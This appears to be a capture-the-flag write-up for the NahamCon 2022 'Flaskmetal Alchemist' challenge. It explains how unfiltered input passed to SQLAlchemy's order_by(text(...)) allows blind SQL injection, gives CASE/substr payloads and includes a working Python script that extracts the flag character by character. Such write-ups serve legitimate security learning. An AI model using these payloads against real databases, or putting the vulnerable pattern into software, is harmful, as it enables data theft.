---
layout: post
title: Order By Blind SQL Injection
subtitle: SQLI | ORDER BY
cover-img: /assets/img/wsc.jpg
thumbnail-img: /assets/img/wsc.jpg
share-img: /assets/img/wsc.jpg
tags: [Web]
---

# NahamCon 2022 - Flaskmetal Alchemist

> Chal URL: `http://challenge.nahamcon.com:31610/`

# Website:

<img src="https://i.imgur.com/k6Rrcam.png">

# Intro:

A Web App Build with flask which stored periodic table was stored. We can Search elements with Atomic Number, Symbol and Name. They used `sqlalchemy`. Basically `sqlalchemy` is a `Object Relational Mapper`, which helps to communicate with Database

# Source Code:

## Database Model

```python
class Metal(Base):
    __tablename__ = "metals"
    atomic_number = Column(Integer, primary_key=True)
    symbol = Column(String(3), unique=True, nullable=False)
    name = Column(String(40), unique=True, nullable=False)

    def __init__(self, atomic_number=None, symbol=None, name=None):
        self.atomic_number = atomic_number
        self.symbol = symbol
        self.name = name


class Flag(Base):
    __tablename__ = "flag"
    flag = Column(String(40), primary_key=True)

    def __init__(self, flag=None):
        self.flag = flag
```

* Table `metals` is used to store elements
* Table `flag` is used to store `flag`

## app.py

```python
from flask import Flask, render_template, request, url_for, redirect
from models import Metal
from database import db_session, init_db
from seed import seed_db
from sqlalchemy import text

app = Flask(__name__)


@app.teardown_appcontext
def shutdown_session(exception=None):
    db_session.remove()


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)

```

## Routes:

```python
@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        search = ""
        order = None
        if "search" in request.form:
            search = request.form["search"]
        if "order" in request.form:
            order = request.form["order"]
        if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
        else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
    else:
        metals = Metal.query.all()
        return render_template("home.html", metals=metals)
```

* Route `/` can Handel Both `GET` and `POST` Methods
* If Method is `POST`, Server Looks for a Body params `search` and `order`

* If the param `order` is Not passed as a param in Post Request,then the Below If Statement will be Triggered.
```python
if order is None:
            metals = Metal.query.filter(Metal.name.like("%{}%".format(search)))
```
* If the Both `search` and `order` params are passed as params in the Post Request,then the Below Else Statement will be Triggered. 
```python
else:
            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
        return render_template("home.html", metals=metals)
```

---

# Blind SQL Injection



```python
# else statement(when both 'search' and 'order' is present)
metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))
```

* `order_by(text(user_input))`. User Input is Not filtered When it is passed into `order_by` statement. 
* By Abusing this, We Perform a Blind SQL Injection to Extract the Flag from Table `flag`

# Exploitation: 

* In Order to Exploit this, We can Use `Case` statements in sql. `Case` Statements are similar to `If Else` Statements on Other Languages.

## ASC and DESC

* The ASC stands for ascending and the DESC stands for descending

* `&order=1+ASC`. See the 78th Line. The elements are Starting from `3rd` Atomic Number

<img src="https://i.imgur.com/6ju6Kt5.png">

* `&order=1+DESC`. See the 78th Line. The elements are Starting from `116th` Atomic Number

<img src="https://i.imgur.com/jxXGmXS.png">

* Note: Flag is in Table `flag`. Like `select flag from flag` will return the flag
* To Exfiltrate, Function like `substr` are Helpful. 
`
substr in SQL is a function used to retrieve characters from a string. With the help of this function, you can retrieve any number of substrings from a single string
`
* Flag Format: `flag{[a-zA-Z0-9_]}`
* So, We can Use `substr` to select the first letter from the flag and check if that match `f`.

* Payload: `&order=(case when (substr((select flag from flag),1,1))=char(102) then atomic_number else name end) desc`. 

* The Above Payload will Check if the first Char of the Flag is equal to `char(102)`, then Order the Elements by their atomic_number in descending order, Else Order the Elements by their name in descending Order. 
* `char(ascii_number)` will return the character according to their ascii Value. ascii value of `f` is `102`

* So, If the Above Injectected Statement is true, then the Elements will be Ordered in descending Order according to atomic_number

<img src="https://i.imgur.com/f1Bkt3r.png">

* Now, We have a basic PoC of Blind SQL Injection. 

* I Used `length` function to Check the Length of the Flag. And The Length of the Flag is 20

payload:
```sql
(case+when+(length((select+flag+from+flag)))=20+then+atomic_number+else+name+end)+desc
```
<img src="https://i.imgur.com/6VXKFUB.png">

---

# Developed Exploit:

```python
import requests
url = 'http://challenge.nahamcon.com:32109'
flag = ['f','l','a','g','{']

def body(num1, num2):
    body = {
    "search":"Li",
    "order":f"(case when (substr((select flag from flag),{int(num1)},1))=char({int(num2)}) then atomic_number else name end) desc"
    }
    return body

for i in range(6,20):
    for j in range(95,126):
        payload = body(i,j)
        r = requests.post(url, data=payload)
        if r.text[2612:2615] == '116':
            flag.append(chr(j))
            print(''.join(flag))
            break


flag.append('}')
print("Flag: "+''.join(flag))

```

<img src="https://i.imgur.com/ys0UK7R.png">

> FLAG : flag{order_by_blind}
